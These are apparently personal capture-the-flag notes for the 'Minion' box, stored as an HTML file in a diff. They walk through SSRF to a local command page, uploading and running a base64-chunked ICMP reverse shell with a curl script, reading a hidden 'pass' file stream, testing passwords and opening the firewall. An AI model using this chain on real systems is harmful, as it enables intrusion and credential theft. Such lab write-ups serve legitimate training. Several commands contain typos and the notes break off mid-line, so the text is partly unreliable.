@@ -1,0 +1,106 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Minion - SSRF CI ICMP Shell Powershell File Streams</title>
+</head><body>Test for Remote File Inclusion<br/>
+Test to see if it can reach itself instead? Success!<br/>
+The site is requesting another site in a parameter, and we can specify it's own localhost to achieve SSRF<br/>
+<br/>
+if using a url as an argument in a url (funky), make sure to only have one "?" (ie url encode the second one)<br/>
+<br/>
+Testing IIS or Windows, a nifty trick is to use <br/>
+powershell exit &lt;num code&gt; <br/>
+<br/>
+ie<br/>
+powershell exit 13<br/>
+Will echo 13. This can be useful if other commands are failing (ie hostname) or filtering is in place<br/>
+<br/>
+<br/>
+C:\Temp\ &#09;&#09;#directory usually exists<br/>
+<br/>
+tcpdump filter on tcp[tcpflags] == tcp-syn&#09;&#09;#see when something first initiates a TCP connection to us<br/>
+tcpdump filter on icmp&#09;&#09;&#09;&#09;&#09;#see when something pings us<br/>
+<br/>
+Egress filter checker, if you have command injection, attempt to do a callback on every port. <br/>
+There are egress check tools if you can get one onto the box<br/>
+<br/>
+Windows ping, make sure it's -n for num count<br/>
+<br/>
+Time for ICMP shell<br/>
+<br/>
+Manually convert to Base64<br/>
+Linux powershell:<br/>
+&nbsp;ps&gt; $RevShell = Get-Content -Raw ./Invoke-PowerShellIcmp.ps1 &nbsp;&#09;#Raw is needed for line breaks<br/>
+&nbsp;ps&gt; $Bytes = [System.Text.Encoding]::Unicode.GetBytes($RevShell)<br/>
+&nbsp;ps&gt; $Encoded = [Convert]::ToBase64String($bytes)<br/>
+&nbsp;ps&gt; $Encoded | Out-File icmp.ps2.b64<br/>
+<br/>
+Target<br/>
+$Decode = [System.Text.Encoding]::Unicode.GetString([System.Conver}::FromBase64String($Encoded))<br/>
+<br/>
+if you don't want to struggle iwth UTF-16 just create a standard b64 file and use certutil.exe on windows to decode the file<br/>
+<br/>
+<br/>
+Now we want to send small chunks, line by line. Linux has a built in tool called 'fold' to handle the formatting.<br/>
+fold -w 120 icmp.ps2.b64&#09;&#09;#-w for width<br/>
+<br/>
+Also need to ensure there is no '+' since some tools will not encode it (and + over a URL is space and will break the payload)<br/>
+<br/>
+Double encoding may only be needed in this case because the payload goes in nested URLs<br/>
+<br/>
+script to send the payload<br/>
+------------------------------------------------------------------------------<br/>
+#!/bin/bash<br/>
+#send shell<br/>
+export IFS=$'\n'&#09;&#09;#IFS normally loop by character, but need to go by full line<br/>
+for i in $(cat icmp.ps2.b64); do<ul><li style="list-style-type: none">&nbsp;ippsec="echo $i &gt;&gt; C;\Temp\ippsec-shell.ps2</li>
+<li style="list-style-type: none">&nbsp;curl -v -G -X GET 'http://web:62696/test.asp?u=http://127.0.0.1/cmd.asp' --data-urlencode "xcmd=$ippsec"</li>
+</ul>
+done<br/>
+<br/>
+#decode payload and write shell<br/>
+curl -v -G -X GET 'http://web:62696/test.asp?u=http://127.0.0.1/cmd.asp' --data-urlencode "xcmd=powershell $x=Get-Content -Raw C:\Temp\ippsec-shell.ps2; $decode = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($x)); $decode &gt; C:\Temp\ippsec-decoded.ps2"<br/>
+<br/>
+#exec shell<br/>
+curl -v -G -X GET 'http://web:62696/test.asp?u=http://127.0.0.1/cmd.asp' --data-urlencode "xcmd=powershell $x=powershell C:\temp\ippsec-decoded.ps2"<br/>
+------------------------------------------------------------------------------<br/>
+<br/>
+Powershell Get-ACL.Owner to get the owner. Get-ACL is a very nice command. <br/>
+<br/>
+<br/>
+Get a ZIP file (or any file)?<br/>
+$BackupZip = Get-Content -Raw C:\Users\Decoder.minion\Desktop\backup.zip<br/>
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($BackupZip)<br/>
+$encoded = [Convert]::ToBase64String($bytes)<br/>
+<br/>
+Now you can copy and paste if your scrollback is large enough<br/>
+<br/>
+If you have issues decoding the data, it may need a conversion from UTF-16 (powershell default) to UTF-8. Linux can use iconv<br/>
+iconv -f UTF-16 -t UTF-8 backup.zip &gt; backup_fixed.zip<br/>
+(This really may not work though)<br/>
+<br/>
+<br/>
+Long way, using powershell to unzip/extract<br/>
+ps&gt; Add-Type -Assembly 'system.io.compression.filesystem';[io.compression.zipfile]::ExtractToDirectory("C:\Users\decoder.minion\Desktop\backup.zip","C:\Temp\")<br/>
+<br/>
+The manual way to look at file streams on Windows with Powershell is: Get-Item -Stream<br/>
+Get-Item -Stream * C:\Users\decoder.minion\Desktop\backup.zip<br/>
+Get-Content C;\Users\decoder.minion\Desktop\backup.zip -Stream 'pass'<br/>
+<br/>
+<br/>
+"Easiest" way to test for user passwords (maybe in a bad/non-stable shell) is with net use<br/>
+net use y: \\localhost\c$ /user:adminsitrator &lt;pass&gt;<br/>
+<br/>
+If it works, the pass works and you can browse with permissions<br/>
+<br/>
+<br/>
+Working with Invoke-Command<br/>
+#Get your pass / creds as a secure string. Ensure user is domain\user or .\user or user<br/>
+$user = '.\administrator'; $pw = '1234test'; $secpw = ConvertTo-SecureString $pw -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential $user, $secpw<br/>
+Invoke-Command -Computername localhost -Credential $cred -ScriptBlock { whoami }<br/>
+<br/>
+<br/>
+Working with firewall<br/>
+New-NetFirewallRule -DisplayName &lt;name&gt; -RemoteAddress &lt;ip_address&gt; -Direction inbound -Action allow <br/>
+New</body></html>
